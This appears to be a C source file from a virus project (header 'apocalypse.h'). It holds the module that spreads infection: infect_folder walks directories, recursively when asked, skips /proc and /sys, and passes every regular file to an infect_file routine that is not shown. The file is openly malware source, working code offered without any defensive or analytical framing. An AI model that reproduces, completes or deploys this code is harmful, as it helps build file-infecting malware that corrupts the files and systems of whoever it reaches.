#include "apocalypse.h"

static int launch(char **paths, int count, e_targets type, int recursive);
static int is_invalid_entry(struct dirent *entry, int recursive);
static void clear_paths(char **paths, size_t n);

int infect_folder
    (const char *dirpath, e_targets type, int recursive)
{
    DIR* dir = opendir(dirpath);
    if (!dir)
        return SUCCESS;
    struct dirent* entry;

    size_t count = 0;
    while ((entry = readdir(dir)))
    {
        if (is_invalid_entry(entry, recursive))
            continue;
        count++;
    }
    if (!count)
        return (closedir(dir), SUCCESS);

    char **paths = malloc(sizeof(char *) * count);
    if (!paths)
        return (closedir(dir), FAILURE);
    rewinddir(dir);

    size_t current = 0;
    const size_t dirlen = strlen(dirpath);
    const int no_slash = dirpath[dirlen - 1] != '/';
    while ((entry = readdir(dir)))
    {
        if (is_invalid_entry(entry, recursive))
            continue;
        char *path = malloc(sizeof(char) *
            (dirlen + strlen(entry->d_name) + no_slash + 1));
        if (!path)
            return (closedir(dir), clear_paths(paths, current), FAILURE);
        sprintf(path, "%s%s%s", dirpath, (no_slash ? "/" : ""), entry->d_name);
        paths[current++] = path;
    }
    closedir(dir);

    int result = launch(paths, count, type, recursive);
    clear_paths(paths, count);
    return result;
}

static
int launch(char **paths, int count, e_targets type, int recursive)
{
    struct stat filestat;

    for (int i = 0; i < count; i++)
    {
        if (!strcmp(paths[i], "/proc") || !strcmp(paths[i], "/sys")
            || stat(paths[i], &filestat) < 0)
            continue;
        if (S_ISDIR(filestat.st_mode))
        {
            if (recursive == TRUE
                && infect_folder(paths[i], type, recursive) == FAILURE)
                return FAILURE;
            continue;
        }
        infect_file(paths[i], type);
    }
    return SUCCESS;
}

static
int is_invalid_entry(struct dirent *entry, int recursive)
{
    if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
        return TRUE;
    if (entry->d_type == DT_REG)
        return FALSE;
    if (entry->d_type == DT_DIR && recursive == TRUE)
        return FALSE;
    return TRUE;
}

static
void clear_paths(char **paths, size_t n)
{
    for (size_t i = 0; i < n; i++)
        free(paths[i]);
    free(paths);
}
